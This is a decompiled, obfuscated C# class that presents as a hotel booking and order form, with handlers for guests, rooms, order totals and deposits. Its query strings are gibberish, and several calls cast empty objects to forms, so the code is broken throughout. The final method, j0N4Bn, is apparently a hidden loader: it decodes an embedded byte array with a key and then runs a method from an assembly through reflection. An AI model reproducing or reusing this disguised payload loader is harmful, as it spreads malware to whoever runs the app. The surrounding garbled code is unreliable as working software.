using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Fs70Aq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Se1g8G;
using Xg95Wb;

namespace Fs7t1A;

public class i5E4Bo
{
	public object SQL;

	public int GuestID;

	public DateTime CheckIn;

	public DateTime CheckOut;

	public int RoomNum;

	public DateTime OrderDate;

	public int Quantity;

	public string OrderItem;

	public double UnitPrice;

	private object currentBtn;

	private Panel leftBorderBtn;

	private Form Currentchildform;

	public int AddCon;

	private Point Pos;

	private object IconCurrentForm;

	private object PanelDesktop;

	private object lblFormTitle;

	private Point Location;

	private object ProductDesclbl;

	private object UnitPricelbl;

	private object Quantitylbl;

	private object OrderTimelbl;

	private object OrderDatelbl;

	private object Namelbl;

	private object BookDatelbl;

	private object Checkoutlbl;

	private object Checkinlbl;

	private object RoomNumlbl;

	private object RoomTypelbl;

	private object DescRoomlbl;

	private object DescDaylbl;

	private object DescPricelbl;

	private object Depositlbl;

	public object Login
	{
		[CompilerGenerated]
		get
		{
			return _Login;
		}
		[CompilerGenerated]
		set
		{
			_Login = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Form1
	{
		[CompilerGenerated]
		get
		{
			return _Form1;
		}
		[CompilerGenerated]
		set
		{
			_Form1 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Totallbl
	{
		[CompilerGenerated]
		get
		{
			return _Totallbl;
		}
		[CompilerGenerated]
		set
		{
			_Totallbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object IDlbl
	{
		[CompilerGenerated]
		get
		{
			return _IDlbl;
		}
		[CompilerGenerated]
		set
		{
			_IDlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Payment
	{
		[CompilerGenerated]
		get
		{
			return _Payment;
		}
		[CompilerGenerated]
		set
		{
			_Payment = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public i5E4Bo()
	{
		SQL = RuntimeHelpers.GetObjectValue(new object());
	}

	private void z9HQd8(object n5G2Ki, Color m3XMx6)
	{
		if (n5G2Ki != null)
		{
			o8J9Yr();
			currentBtn = RuntimeHelpers.GetObjectValue(n5G2Ki);
			NewLateBinding.LateSet(currentBtn, (Type)null, "BackColor", new object[1] { Color.FromArgb(37, 36, 81) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "ForeColor", new object[1] { m3XMx6 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "IconColor", new object[1] { m3XMx6 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "ImageAlign", new object[1] { (object)(ContentAlignment)64 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "TextImageRelation", new object[1] { (object)(TextImageRelation)8 }, (string[])null, (Type[])null);
			((Control)leftBorderBtn).set_BackColor(m3XMx6);
			((Control)leftBorderBtn).set_Location(new Point(0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(currentBtn, (Type)null, "Location", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Y", new object[0], (string[])null, (Type[])null, (bool[])null))));
			((Control)leftBorderBtn).set_Visible(true);
			((Control)leftBorderBtn).BringToFront();
			NewLateBinding.LateSet(IconCurrentForm, (Type)null, "IconChar", new object[1] { NewLateBinding.LateGet(currentBtn, (Type)null, "IconChar", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(IconCurrentForm, (Type)null, "IconColor", new object[1] { m3XMx6 }, (string[])null, (Type[])null);
		}
	}

	private void o8J9Yr()
	{
		if (currentBtn != null)
		{
			NewLateBinding.LateSet(currentBtn, (Type)null, "BackColor", new object[1] { Color.FromArgb(31, 30, 68) }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "ForeColor", new object[1] { Color.Gainsboro }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "IconColor", new object[1] { Color.Gainsboro }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)16 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "ImageAlign", new object[1] { (object)(ContentAlignment)16 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(currentBtn, (Type)null, "TextImageRelation", new object[1] { (object)(TextImageRelation)4 }, (string[])null, (Type[])null);
		}
	}

	private void s1Q3Tz(Form Pb0f7S)
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		if (Currentchildform != null)
		{
			Currentchildform.Close();
		}
		Pb0f7S.set_TopLevel(false);
		Pb0f7S.set_FormBorderStyle((FormBorderStyle)0);
		((Control)Pb0f7S).set_Dock((DockStyle)5);
		object[] array;
		bool[] array2;
		NewLateBinding.LateCall(NewLateBinding.LateGet(PanelDesktop, (Type)null, "Controls", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", array = new object[1] { Pb0f7S }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
		if (array2[0])
		{
			Pb0f7S = (Form)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(Form));
		}
		((Control)Pb0f7S).BringToFront();
		((Control)Pb0f7S).Show();
		NewLateBinding.LateSet(lblFormTitle, (Type)null, "Text", new object[1] { Pb0f7S.get_Text() }, (string[])null, (Type[])null);
	}

	private void Bo45Zb(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void i3X5Lp(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void p1H0Nj(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void To7g4Q(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void a2Z6Fj(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void m8HEw7(object sender, EventArgs e)
	{
		Db8c0R();
	}

	private void Db8c0R()
	{
		throw new NotImplementedException();
	}

	private void Pi76Sy(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		z9HQd8(RuntimeHelpers.GetObjectValue(sender), Color.LightCyan);
		s1Q3Tz((Form)new object());
	}

	private void Rb6w7H(object sender, EventArgs e)
	{
		NewLateBinding.LateCall(Login, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		Db8c0R();
	}

	private void Ny71Rm(object sender, EventArgs e)
	{
		NewLateBinding.LateSetComplex(IDlbl, (Type)null, "Text", new object[1] { GuestID }, (string[])null, (Type[])null, false, true);
		object sQL = SQL;
		object[] obj = new object[2] { "ytfgdvcx", null };
		ref int guestID = ref GuestID;
		obj[1] = guestID;
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			guestID = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "mjyt5y4" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Namelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(OrderDatelbl, (Type)null, "Text", new object[1] { OrderDate.Date }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(OrderTimelbl, (Type)null, "Text", new object[1] { OrderDate.ToLongTimeString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Quantitylbl, (Type)null, "Text", new object[1] { Quantity }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(UnitPricelbl, (Type)null, "Text", new object[1] { UnitPrice }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ProductDesclbl, (Type)null, "Text", new object[1] { OrderItem }, (string[])null, (Type[])null);
		NewLateBinding.LateSetComplex(Totallbl, (Type)null, "Text", new object[1] { UnitPrice * (double)Quantity }, (string[])null, (Type[])null, false, true);
	}

	private void Rp52Xq(object sender, EventArgs e)
	{
		object sQL = SQL;
		object iDlbl;
		object[] obj = new object[2]
		{
			"34rtfdvs",
			NewLateBinding.LateGet(iDlbl = IDlbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)
		};
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(iDlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2]
		{
			"cvcxsfdfewr",
			NewLateBinding.LateGet(iDlbl = Totallbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)
		}, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(iDlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "fgfggtre4t4t43" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(Form1, (Type)null, "AddCon", new object[1] { 1 }, (string[])null, (Type[])null, false, true);
		Db8c0R();
	}

	private void Xp96Yf(object sender, EventArgs e)
	{
		Db8c0R();
	}

	private void o9B6Pt(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			Location += (Size)(Control.get_MousePosition() - (Size)Pos);
		}
		Pos = Control.get_MousePosition();
	}

	private void Rq91Ep(object sender, EventArgs e)
	{
		NewLateBinding.LateSetComplex(IDlbl, (Type)null, "Text", new object[1] { GuestID }, (string[])null, (Type[])null, false, true);
		object sQL = SQL;
		object[] obj = new object[2] { "dfdfer4", null };
		ref int guestID = ref GuestID;
		obj[1] = guestID;
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			guestID = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "Sdfdfgrw4" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Namelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(BookDatelbl, (Type)null, "Text", new object[1] { DateTime.Now }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Checkinlbl, (Type)null, "Text", new object[1] { CheckIn.ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Checkoutlbl, (Type)null, "Text", new object[1] { CheckOut.ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(RoomNumlbl, (Type)null, "Text", new object[1] { RoomNum }, (string[])null, (Type[])null);
		object sQL2 = SQL;
		object[] obj3 = new object[2] { "egrdggrdfdfm", null };
		object roomNumlbl = RoomNumlbl;
		obj3[1] = NewLateBinding.LateGet(roomNumlbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null);
		array = obj3;
		NewLateBinding.LateCall(sQL2, (Type)null, "AddParam", obj3, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(roomNumlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "Ssfegsdgewt432num;" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(RoomTypelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(DescRoomlbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(RoomTypelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
		int num = checked((int)DateAndTime.DateDiff((DateInterval)4, CheckIn.Date, CheckOut.Date, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
		NewLateBinding.LateSet(DescDaylbl, (Type)null, "Text", new object[1] { num }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(DescPricelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSetComplex(Totallbl, (Type)null, "Text", new object[1] { Operators.MultiplyObject(NewLateBinding.LateGet(DescDaylbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), NewLateBinding.LateGet(DescPricelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSet(Depositlbl, (Type)null, "Text", new object[1] { Operators.MultiplyObject(Operators.MultiplyObject(NewLateBinding.LateGet(DescPricelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0.2), NewLateBinding.LateGet(DescDaylbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
	}

	private void j6RPf9(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		string text = "dfg";
		decimal.TryParse(Conversions.ToString(NewLateBinding.LateGet(Totallbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), out var result);
		object sQL = SQL;
		object iDlbl;
		object[] obj = new object[2]
		{
			"34trg",
			NewLateBinding.LateGet(iDlbl = IDlbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)
		};
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(iDlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "4t4g", now }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			now = (DateTime)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(DateTime));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "4trygh", text }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "5yrtsfd", result }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			result = (decimal)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(decimal));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "3wtj", result }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			result = (decimal)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(decimal));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", new object[2] { "5yhrtgh", 0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", new object[2] { "dgdfgtw4", 0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "bnnvbbce4w" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(Payment, (Type)null, "Deposit", new object[1] { 1 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(Payment, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	internal static void j0N4Bn(object n7Y8Fe, byte[] s4ZPe8, int i2YWn5)
	{
		byte[] array = (byte[])c6C3Fx.Data;
		checked
		{
			int num = ((byte[])c6C3Fx.Data).Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + Sr42Xw.Bg4j0W(i2YWn5, s4ZPe8.Length, null, null, 1);
				int num3 = num2 & i2YWn5;
				int num4 = Sr42Xw.Bg4j0W(i, s4ZPe8.Length, null, null, 1);
				int num5 = s4ZPe8[num4];
				int num6 = Sr42Xw.Bg4j0W(0, 0, num5, num3, 2);
				int num7 = Conversions.ToInteger(NewLateBinding.LateIndexGet(c6C3Fx.Data, new object[1] { i }, (string[])null));
				array[i] = (byte)Sr42Xw.Bg4j0W(0, 0, num7, num6, 2);
			}
			List<string> list = new List<string>();
			list.Add("cvfgngfj");
			list.Add("dd78987oofdf");
			list.Add("543355");
			object objectValue = RuntimeHelpers.GetObjectValue(n5T8Lx.Bi72Lo(RuntimeHelpers.GetObjectValue(new object()), array));
			if (objectValue == null)
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(c6C3Fx.Ass, (Type)null, "GetExportedTypes", new object[1] { c6C3Fx.TNum - 27 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetMethods", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 0 }, (string[])null));
				if (objectValue2 != null)
				{
					NewLateBinding.LateCall(objectValue2, (Type)null, "Invoke", new object[2]
					{
						null,
						new object[0]
					}, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
		}
	}
}
